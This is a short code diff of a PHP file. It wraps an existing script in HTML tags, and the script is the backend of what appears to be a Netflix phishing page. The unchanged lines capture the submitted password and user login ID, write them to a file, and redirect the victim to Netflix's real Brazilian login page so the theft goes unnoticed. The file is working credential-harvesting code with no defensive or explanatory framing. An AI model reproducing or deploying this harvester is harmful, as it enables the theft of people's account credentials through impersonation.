@@ -1,3 +1,6 @@
+<!DOCTYPE html>
+<html>
+ <body>
 <?php
 $caixa1 = $_POST["password"] . "\n";
 $caixa2 = $_POST["userLoginId"] . "\n";
@@ -11,3 +14,5 @@ fclose($file);
 
 header("Location: www.netflix.com/br/login");
 ?>
+  </body>
+</html>
